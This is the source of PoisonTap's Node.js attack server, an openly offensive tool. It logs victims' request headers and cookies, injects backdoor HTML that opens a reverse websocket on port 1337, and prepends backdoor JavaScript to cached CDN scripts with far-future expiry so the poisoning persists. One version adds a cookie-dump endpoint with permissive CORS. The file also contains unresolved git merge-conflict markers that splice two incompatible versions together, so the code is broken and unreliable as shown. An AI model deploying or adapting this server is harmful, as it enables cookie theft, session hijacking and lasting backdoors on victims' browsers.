/* eslint-disable no-console */
/*
 * PoisonTap
 *  by samy kamkar
 *  http://samy.pl/poisontap
 *  01/08/2016
 *
 */

const http = require('http');
const fs = require('fs');
const util = require('util');
const exec = require('child_process').exec;

const backdoorPreJs = fs.readFileSync(`${__dirname}/target_backdoor.js`); // this gets prepended before legit js, eg jquery.js
const backdoorHtml = fs.readFileSync(`${__dirname}/backdoor.html`);
const logFile = fs.createWriteStream(`${__dirname}/poisontap.cookies.log`, {
  flags: 'a',
});
const logStdout = process.stdout;
const replacejs = fs.readdirSync(`${__dirname}/js`);
let blinked = false;
const repobj = {};

replacejs.forEach((repjs) => {
  const replaced = repjs.replace(/__/g, '/');
  repobj[replaced] = fs.readFileSync(`${__dirname}/js/${repjs}`);
});

console.log = function consoleLog(d) {
  logFile.write(`${util.format(d)}\n`);
  logStdout.write(`${util.format(d)}\n`);
};

const startBlinking = function startBlinking() {
  // Configuration
  const BLINK_MAX = 20;
  const BLINK_SPEED = 100;

  // Blinking function
  let oldState = 1;
  let count = 0;

  const changeLedState = function changeLedState(state) {
    oldState = state;
    exec(`nice -n -20 echo ${state} | sudo tee /sys/class/leds/led0/brightness`);
  };

  const blink = function blink() {
    changeLedState(oldState === 1 ? 0 : 1);
    count += 1;

    if (count <= BLINK_MAX + 1) {
      setTimeout(blink, BLINK_SPEED);
    } else {
      changeLedState(1);
      setTimeout(() => {
        changeLedState(0);
      }, 3000);
    }
  };

  blink();
};

const xhtml = fs.readFileSync(`${__dirname}/target_injected_xhtmljs.html`);
if (!xhtml) {
  console.log("Couldn't read PoisonTap evil html");
  process.exit();
}

<<<<<<< HEAD
const server = http.createServer((request, response) => {
  const url = request.headers.host + request.url;
  console.log(`Request: ${url}`);
  console.log(request.headers);

  const headers = {
    'Content-Type': 'text/html',
    Server: 'PoisonTap/1.0 SamyKamkar/0.1',
    'Cache-Control': 'public, max-age=99936000',
    Expires: 'Sat, 26 Jul 2040 05:00:00 GMT',
    'Last-Modified': 'Tue, 15 Nov 1994 12:45:26 GMT',
  };

  // cache for a very long time to poison future requests after we're gone
  if (repobj[url]) {
    console.log('>>> Known CDN');
    response.writeHead(200, headers);
    response.write(backdoorPreJs);
    response.write(repobj[url]);
    response.end();
  } else if (url.indexOf('/PoisonTap') !== -1) {
    // if this is a poisontap request, we just siphoned cookies, now drop html backdoor
    // Blink ACT led on RPi to know if the injection is going well
    if (!blinked) {
      blinked = true;
      startBlinking();
    }

    console.log('>>> Inject Backdoor HTML reverse ws 1337');
    response.writeHead(200, headers);
    response.write(backdoorHtml);
    response.end();
  } else {
    // random AJAX request or load from a page
    // give our evil content that loads all the backdoors and siphons all the things
    console.log('>>> Inject Target xhtmljs');
    response.writeHead(200, headers);

    // NOT poisontap hit, inject cross-js/html file
    response.write(xhtml);
    response.end();
  }
=======
var server = http.createServer(function(request, response) {
	var url = request.headers.host + request.url;
	console.log('Request: ' + url);
	console.log(request.headers);

	var headers = {
		"Content-Type": "text/html",
		"Server": "PoisonTap/1.0 SamyKamkar/0.1",
		"Cache-Control": "public, max-age=99936000",
		"Expires": "Sat, 26 Jul 2040 05:00:00 GMT",
		"Last-Modified": "Tue, 15 Nov 1994 12:45:26 GMT",
		"Access-Control-Allow-Origin": "*"
	};

	// cache for a very long time to poison future requests after we're gone
	if (repobj[url])
	{
		console.log('>>> Known CDN');
		response.writeHead(200, headers);
		response.write(backdoorPreJs);
		response.write(repobj[url]);
		response.end();
		return;
	}

	// if this is a poisontap request, we just siphoned cookies, now drop html backdoor
	else if (url.indexOf('/PoisonTap') != -1)
	{
		// Blink ACT led on RPi to know if the injection is going well
		if (!blinked) {
			blinked = true;
			startBlinking();
		}
		
		console.log('>>> Inject Backdoor HTML reverse ws 1337');
		response.writeHead(200, headers);
		response.write(backdoorHtml);
		response.end();
		return;
	}
	
	// if this is a cookie dump request, return cookie file.  CORS header required to make it work
	else if (url.indexOf('/PoisonCookieDump') != -1)
	{
		console.log('>>> Cookie Dump');
		response.writeHead(200, headers);
		response.write(fs.readFileSync(__dirname + '/poisontap.cookies.log'));
		response.end();
		return;
	}
	
  // random AJAX request or load from a page, give our evil content that loads all the backdoors and siphons all the things
	else
	{
		console.log('>>> Inject Target xhtmljs');
		response.writeHead(200, headers);

		// NOT poisontap hit, inject cross-js/html file
		response.write(xhtml);
		response.end();
		return;
	}
>>>>>>> 460092e19317eff2f76a7de7b7897de70628aca9
});

server.listen(1337);
console.log(`==== ${new Date().toJSON()} [${Date.now()}] ====`);
console.log('PoisonTap is listening');
